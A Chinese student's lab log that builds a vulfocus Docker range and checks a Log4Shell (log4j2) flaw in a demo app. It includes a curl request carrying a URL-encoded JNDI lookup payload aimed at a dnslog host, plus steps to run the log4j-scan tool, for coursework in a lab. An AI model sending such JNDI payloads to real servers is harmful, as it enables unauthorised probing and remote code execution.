# 个人实践日志

---

## 开发环境搭建

```
# 克隆ctfgame仓库
git clone https://github.com/c4pr1c3/ctf-games.git

# 安装docker镜像
sudo apt update && sudo apt install -y docker.io docker-compose jq

# 将当前用户添加到 docker 用户组，免 sudo 执行 docker 相关指令
# 重新登录 shell 生效
sudo usermod -a -G docker kali

# 切换到 root 用户
sudo su -

# 该镜像源是移动互联网安全课上老师分享的链接，是docker.io的镜像网站
cat <<EOF > /etc/docker/daemon.json
{
  "registry-mirrors": [
    "https://docker.chenby.cn"
  ]
}
EOF

# 重启 docker 守护进程
systemctl restart docker

# 提前拉取 vulfocus 镜像
docker pull vulfocus/vulfocus:latest

#启动脚本,并输入LOCAL_IP 192.168.127.12
sudo bash start.sh

```
![](/img/doubleJ/环境配置1.png)
(中间流程忘记截图了，直接展示构建的docker镜像)
![](/img/doubleJ/镜像构建.png)

- 进入登录界面（账号密码均为admin）
![](/img/doubleJ/登录界面.png)

- 左边菜单栏【镜像管理】-【镜像管理】-【一键同步】
搜索log4j2，选择第一个搜索结果进行下载
![](/img/doubleJ/log4j2.png)
![](/img/doubleJ/首页查看.png)
这样漏洞攻防环境就已经配置好，可以开始实验了


## 检测漏洞存在性
- 首先在登录的界面里启动log4j2
```
# 查看容器名称
sudo docker ps

# 查看宿主机已经存在的登录shell
sudo docker exec it modest_ganguly sh
cat /etc/shells

# 进入到容器内
sudo docker exec -it modest_ganguly /bin/bash

# 找到jar包
ls

# 把jar包复制到kali上
# docker cp <容器名称或ID>:<容器内⽂件路径> <宿主机⽬标路径>
sudo docker cp bold_varahamihira:/demo/demo.jar ./

```
![](/img/doubleJ/启动log4j2.png)
![](/img/doubleJ/复制jar包.png)
![](/img/doubleJ/demojar包.png)

- 对demo.jar包使用java-decompiler反编译工具进行分析
这里可以配置ssh服务，将文件转入宿主机中，然后再宿主机里下载该工具进行分析，但是我选择的是直接在kali虚拟机中下载该工具进行分析
```
  sudo apt install jd-gui
```
然后使用该工具打开demo.jar包
![](/img/doubleJ/利用反编译工具打开jar.png)

- 打开包后，点击菜单栏的search搜索hello
![](/img/doubleJ/搜索hello.png)

- 该环境使用的是log4j低于2.15.0的2.14.0版本，且源代码使用了log4j相关缺陷函数，我们可以确定该环境是存在log4j2漏洞的,漏洞存在性得到验证
![](/img/doubleJ/漏洞存在性.png)

## 漏洞可利用性验证
---
### 方法一：使用dnslog
- 在靶机浏览器中打开dnslog.cn，点击get subdomain获取随机域名
我的为nwx03t.dnslog.cn

- 在攻击者主机输入
```
curl http://192.168.56.105:52972/hello?payload=%24%7bjndi%3aldap%3a%2f%2fnwx03t.dnslog.cn%7d
```
![](/img/doubleJ/攻击靶机.png)

回到靶机上，在dnslog.cn网页中点击refresh发现成功记录到get请求
![](/img/doubleJ/dnslog.png)

- 一开始做的时候根据老师视频演示的代码来做发现运行不了的问题，然后我们查看根据反编译结果发现，缺陷函数用到的是get请求方法，所以该环境不能支持post,所以我们得换成发送get请求

### 方法二：使用log4j-scan
```
# 攻击者主机：克隆log4j2仓库
git clone https://github.com/fullhunt/log4j-scan
cd log4j-scan
```
![](/img/doubleJ/下载log4j-scan.png)

```
# 攻击者主机：安装pip
sudo apt update && sudo apt install -y python3-pip

# 攻击者主机：安装所需要的依赖包
pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
```
![](/img/doubleJ/安装pip和依赖包.png)

```
# 使用以下代码无脑替换
sed -i.bak 's/password"/password", "payload"/' log4j-scan.py

# 攻击者主机：检测log4j2漏洞
python3 log4j-scan.py --request-type get -u http://192.168.127.14:18846/hello
```
这里出现了报错暂时无法解决
